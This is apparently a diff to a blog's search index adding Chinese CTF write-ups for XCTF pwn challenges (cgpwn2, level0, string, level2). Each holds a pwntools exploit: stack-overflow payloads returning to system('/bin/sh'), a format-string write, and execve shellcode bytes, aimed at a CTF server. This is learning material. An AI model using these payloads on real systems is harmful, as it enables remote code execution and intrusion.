@@ -247,7 +247,7 @@
   </entry>
   <entry>
     <title>攻防世界—cgpwn2</title>
-    <url>/SQLInject/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94cgpwn2/</url>
+    <url>/%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94cgpwn2/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
 <p>开始学习PWN！</p>
 </blockquote>
@@ -280,7 +280,7 @@
 <p>利用第一个输入，写我们想要执行的命令，eg： &#x2F;bin&#x2F;sh</p>
 <p>利用第二个输入的gets进行栈溢出，拼接出 system &#x2F;bin&#x2F;sh：</p>
 <ul>
-<li>先将字符串s填满在把s的栈地址填满，将返回地址改成system地址</li>
+<li>先将字符串s填满在把s的栈地址填满，将返回地址改成system地址，32位程序要填返回地址</li>
 <li>再填四字节无用地址堵住system的返回地址，至于为什么要用四，是因为他的长度为四</li>
 <li>然后缝合上之前输入的&#x2F;bin&#x2F;sh的地址<br>python3中需要把所有都转化为字节<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>,<span class="number">63983</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn006&quot;)</span></span><br><span class="line">binsh = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">system = <span class="number">0x8048420</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x26</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">0x4</span> + p32(system) + p32(<span class="number">0</span>) + p32(name)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please tell me your name&quot;</span>,binsh)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;hello,you can leave some message here:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
 </ul>
@@ -292,7 +292,86 @@
         <category>二进制安全</category>
       </categories>
       <tags>
-        <tag>PWN,WP</tag>
+        <tag>PWN</tag>
+        <tag>WP</tag>
+        <tag>栈溢出</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界—level0</title>
+    <url>/%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94level0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续肝题</p>
+<p><a href="https://sm.ms/image/oabOhk5WZ26NEXg" target="_blank"><img src="https://s2.loli.net/2022/03/01/oabOhk5WZ26NEXg.png" ></a></p>
+<span id="more"></span>
+
+<p>先下载附件分析一下。</p>
+<p><a href="https://sm.ms/image/NuVC1yQYpe523Kb" target="_blank"><img src="https://s2.loli.net/2022/03/01/NuVC1yQYpe523Kb.png" ></a></p>
+<p>64位程序，未开启Stack典型的栈溢出了。</p>
+<p><code>shift+f12</code></p>
+<p><a href="https://sm.ms/image/NKGtmcEHy6geBxs" target="_blank"><img src="https://s2.loli.net/2022/03/01/NKGtmcEHy6geBxs.png" ></a></p>
+<p>在按x寻找入口函数。</p>
+<p><a href="https://sm.ms/image/R24rPmzvyNKZgpj" target="_blank"><img src="https://s2.loli.net/2022/03/01/R24rPmzvyNKZgpj.png" ></a></p>
+<p>开始地址是<code>400596</code></p>
+<p><a href="https://sm.ms/image/M4EvKkXRf3S87Uh" target="_blank"><img src="https://s2.loli.net/2022/03/01/M4EvKkXRf3S87Uh.png" ></a></p>
+<p><code>vulnerable_function()</code> 函数中的buf只有80位。</p>
+<p><a href="https://sm.ms/image/ZE2VJQqxtGPf1Cy" target="_blank"><img src="https://s2.loli.net/2022/03/01/ZE2VJQqxtGPf1Cy.png" ></a></p>
+<p>却可以输入200位。</p>
+<p><a href="https://sm.ms/image/nDysGhUNJvdEWkc" target="_blank"><img src="https://s2.loli.net/2022/03/01/nDysGhUNJvdEWkc.png" ></a></p>
+<p>存在栈溢出。返回地址r是8字节。</p>
+<p><a href="https://sm.ms/image/aX4PDY7pF2yEqvU" target="_blank"><img src="https://s2.loli.net/2022/03/01/aX4PDY7pF2yEqvU.png" ></a></p>
+<p>由此构造payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>, <span class="number">57658</span>)</span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(callsystem)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hello, World\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p>得到flag</p>
+<p><a href="https://sm.ms/image/LgQmifBeUKcNrX1" target="_blank"><img src="https://s2.loli.net/2022/03/01/LgQmifBeUKcNrX1.png" ></a></p>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>WP</tag>
+        <tag>栈溢出</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界-string</title>
+    <url>/D&amp;D/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看了半天才完全看懂，我太菜了</p>
+<p><a href="https://sm.ms/image/9BfFEq2nxNMGgha" target="_blank"><img src="https://s2.loli.net/2022/03/02/9BfFEq2nxNMGgha.jpg" ></a></p>
+<span id="more"></span>
+
+<p>老规矩，先分析一下文件</p>
+<p><a href="https://sm.ms/image/kAlCEnJW5cItYhX" target="_blank"><img src="https://s2.loli.net/2022/03/02/kAlCEnJW5cItYhX.png" ></a></p>
+<p>分析了很多次就不多说了。</p>
+<p>然后用64位IDA打开，从题目名字可猜测，是一道格式化字符串漏洞的题，所以等下<code>print()</code>着重看一下。</p>
+<p>可以在Linux中先将程序跑一遍，对程序的流程和分支有个大概了解。本题是个简单的<code>D&amp;D类型题目</code>。</p>
+<p>用IDA对程序进行分析，顺着程序的流程走，可以看到在<code>sub_400BB9</code>中有<code>printf(&amp;format, &amp;format)</code>语句，存在格式化字符串漏洞。</p>
+<p><a href="https://sm.ms/image/zGV4kEbBK6MFhdH" target="_blank"><img src="https://s2.loli.net/2022/03/02/zGV4kEbBK6MFhdH.png" ></a></p>
+<p>此外，在函数<code>sub_400CA6</code>中，可以发现<code>_QWORD</code>的分支有命令执行的语句，可以直接执行外部输入的命令。</p>
+<p><a href="https://sm.ms/image/dFbASI2gfquo1Hl" target="_blank"><img src="https://s2.loli.net/2022/03/02/dFbASI2gfquo1Hl.png" ></a></p>
+<p>因此，本题的关键在于，如何利用格式化字符串漏洞，让程序的控制流进入到命令执行语句；也就是说，进入<code>sub_400CA6</code>函数中，且满足<code>*a == a1[1]</code>的条件。</p>
+<p>IDA进行具体分析：</p>
+<p><a href="https://sm.ms/image/nxJm851hlgsdIGH" target="_blank"><img src="https://s2.loli.net/2022/03/02/nxJm851hlgsdIGH.png" ></a></p>
+<p><a href="https://sm.ms/image/cMpjYonTDkWVAsE" target="_blank"><img src="https://s2.loli.net/2022/03/02/cMpjYonTDkWVAsE.png" ></a></p>
+<p><a href="https://sm.ms/image/9ikWMPQwpITAZy3" target="_blank"><img src="https://s2.loli.net/2022/03/02/9ikWMPQwpITAZy3.png" ></a></p>
+<p><a href="https://sm.ms/image/VOsouYUzf6QwJxK" target="_blank"><img src="https://s2.loli.net/2022/03/02/VOsouYUzf6QwJxK.png" ></a></p>
+<p>使用Pwngdb在<code>printf(&amp;format, &amp;format)</code> 处设置断点，输入<code>0x052345</code>，在栈顶的第二个8字节，根据64位程序的传参方式，该地址是格式化字符串的第 7 个参数，<code>printf()</code> 函数的第 8 个参数。</p>
+<p><a href="https://sm.ms/image/lOUF8RC7wn9JHGD" target="_blank"><img src="https://s2.loli.net/2022/03/02/lOUF8RC7wn9JHGD.png" ></a></p>
+<p>由此可以得到EXP</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch = &#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># context(terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./string&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>, <span class="number">58455</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;secret[0] is &#x27;</span>)</span><br><span class="line">v3_addr = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v3_addr = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + v3_addr, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(v3_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;name be:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;east or up?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;east&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;leave(0)?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;\&#x27;Give me an address\&#x27;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(v3_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;you wish is:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%85c%7$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;I will help you! USE YOU SPELL&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p><a href="https://sm.ms/image/ByVwobOZNFc2lfE" target="_blank"><img src="https://s2.loli.net/2022/03/02/ByVwobOZNFc2lfE.png" ></a></p>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>WP</tag>
+        <tag>栈溢出</tag>
       </tags>
   </entry>
   <entry>
@@ -491,6 +570,26 @@
       </categories>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界—level2</title>
+    <url>/%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94leve2/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>流程和上一题没差多少，所以直接给EXP了</p>
+<span id="more"></span>
+
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>,<span class="number">62163</span>)</span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line">bin_s = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4</span> + p32(system) + p32(<span class="number">0</span>) + p32(bin_s)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>WP</tag>
+        <tag>栈溢出</tag>
       </tags>
   </entry>
   <entry>
